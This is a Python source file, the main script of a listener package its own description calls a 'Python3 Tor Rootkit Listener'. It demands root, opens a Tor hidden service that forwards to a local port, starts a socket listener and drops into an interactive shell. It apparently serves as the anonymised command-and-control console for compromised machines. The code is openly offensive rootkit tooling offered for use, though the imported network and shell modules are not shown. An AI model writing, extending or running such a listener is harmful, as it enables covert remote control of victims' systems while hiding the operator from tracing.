#!/usr/bin/env python3
from argparse import ArgumentParser
from network import ListenerSocket, TorHiddenService
from shell import ListenerShell
from style import Style
import os
import sys

"""
The main class of the listener Package.
It handles all other modules of the listener package.
"""
class Listener(Style):
    def __init__(self):
        self.checkRunningAsRoot()
        lport, fport = Listener.getCommandLineArgs()
        torHS = TorHiddenService('listener', lport, fport)
        listenerSocket = ListenerSocket(fport)
        listenerSocket.start()
        shell = ListenerShell(listenerSocket)
        shell.run()

    """
    Returns the command line arguments of the programm call.
    Example: ./listener.py 8080 8080
    """
    @staticmethod
    def getCommandLineArgs() -> int:
        parser = ArgumentParser(description='Python3 Tor Rootkit Listener')
        parser.add_argument('lport', type=int, help='The port the hidden service should listen on.')
        parser.add_argument('fport', type=int, help='The port the hidden service shoudl forward to.')
        args = parser.parse_args()
        return args.lport, args.fport

    """
    Check if the programm runs as root.
    """
    def checkRunningAsRoot(self):
        if os.getuid() != 0:
            self.negSysMsg('Please run as root.')
            sys.exit(1)


if __name__ == '__main__':
    Listener()
